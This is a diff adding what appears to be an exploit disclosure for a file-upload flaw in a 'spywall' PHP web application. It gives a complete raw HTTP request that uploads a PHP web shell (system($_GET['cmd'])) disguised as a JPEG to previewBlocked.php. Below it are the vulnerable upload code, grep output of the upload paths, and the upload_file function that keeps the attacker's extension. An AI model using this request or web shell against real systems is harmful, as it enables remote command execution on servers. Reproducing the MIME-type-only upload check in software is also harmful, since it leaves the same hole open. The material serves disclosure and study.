@@ -1,0 +1,95 @@
+///////////////////////////HTTP RAW REQUEST////////////////////////////////////////////////////////
+
+POST /spywall/previewBlocked.php HTTP/1.1
+Host: 192.168.11.199
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=ab7e2b581b5a4bf89f8d00a0a3cb9d74
+Content-Length: 204
+Cookie: PHPSESSID=3163872156e7258eccf106a5e9c07312
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+--ab7e2b581b5a4bf89f8d00a0a3cb9d74
+Content-Disposition: form-data; name="new_image"; filename="sam.php"
+Content-Type: image/jpg
+
+<?php system($_GET['cmd']); ?>
+--ab7e2b581b5a4bf89f8d00a0a3cb9d74--
+//////////////////////////////////////////////////////////////////////////////////////////////
+
+
+// Vulnerable Code in previewBlocked
+
+	$new_image = $_FILES['new_image'];
+	if ($new_image['error'] == UPLOAD_ERR_OK && $new_image['size'] > 0) {
+		if (substr($new_image['type'], 0, 5) == 'image') {
+			if ($new_image['size'] <= 500 * 1024 * 1024) {
+				$new_image_path = "$upload_image_path/previewLogo";
+				if (file_exists($new_image_path)) {
+					unlink($new_image_path);
+				}
+				$return_arr = upload_file($new_image, $upload_image_path, 'previewLogo');
+				if ($return_arr['uploaded']) {
+					$msgData['image_name'] = $return_arr['new_file_name'];
+				}
+			}
+		}
+	}
+	$image_name = $msgData['image_name'];
+//////////////////////////////////////////////////////////////////////////////////////////////////////////
+[root@localhost spywall]# grep -r '$upload_image_path' *
+admin_messages.php:					$return_arr = upload_file($new_image, $upload_image_path);
+admin_messages.php:						$new_image_path = "$upload_image_path/$image_name";
+admin_messages.php:									$old_image_path = "$upload_image_path/$oldImage";
+admin_messages.php:				$new_path = $upload_image_path . "/". $image_name;
+blocked_file.php:			$return_arr = upload_file($new_image, $upload_image_path_temp, "temp");
+blocked_url.php:			$return_arr = upload_file($new_image, $upload_image_path_temp, "temp");
+blockpage_default.php:	$old_image_path = $upload_image_path . "/". $old_image_name;
+config/conf.php:	$upload_image_path = "/var/www/html/spywall/images/upload";
+config/conf.php:	$upload_image_path_temp = "images/upload/temp";
+download_file.php:													$new_path = "$upload_image_path/$image_name";
+includes/infectedBody.php:							$new_path = "$upload_image_path/$image_name";
+includes/timerBody.php:						$new_path = "$upload_image_path/$image_name";
+previewBlocked.php:				$new_image_path = "$upload_image_path/previewLogo";
+previewBlocked.php:				$return_arr = upload_file($new_image, $upload_image_path, 'previewLogo');
+previewInfected.php:				$new_image_path = "$upload_image_path/previewLogo";
+previewInfected.php:				$return_arr = upload_file($new_image, $upload_image_path, 'previewLogo');
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+	function upload_file($file_details, $new_path, $new_file_base_name = '')
+	{
+		$uploaded = false;
+		$file_name = $file_details["name"];
+		if ($new_file_base_name != '') // new file name provided
+		{
+			// find out its extention and create new filename
+			$pat = '/\.[A-Za-z0-9]*$/';
+			preg_match($pat, $file_name, $ext_arr);
+			$new_file_ext = strtolower(substr($ext_arr[0], 1));
+			$file_name = $new_file_base_name . ".". $new_file_ext;
+		}
+		$return_arr = array();
+		if ($file_name != "")
+		{
+			$temp_file_name = trim($file_details["tmp_name"]);
+			if (@is_uploaded_file($temp_file_name))
+			{
+				$new_file_name = $file_name;
+				$new_file_path = $new_path . "/". $new_file_name;
+				if (move_uploaded_file($temp_file_name, $new_file_path))
+				{
+					$uploaded = true;
+				}
+			}
+
+		}
+		$return_arr['uploaded'] = $uploaded;
+		$return_arr['new_file_name'] = $new_file_name;
+		return $return_arr;
+////////////////////////////////////////////////////////////////////////////////////////////////////////////
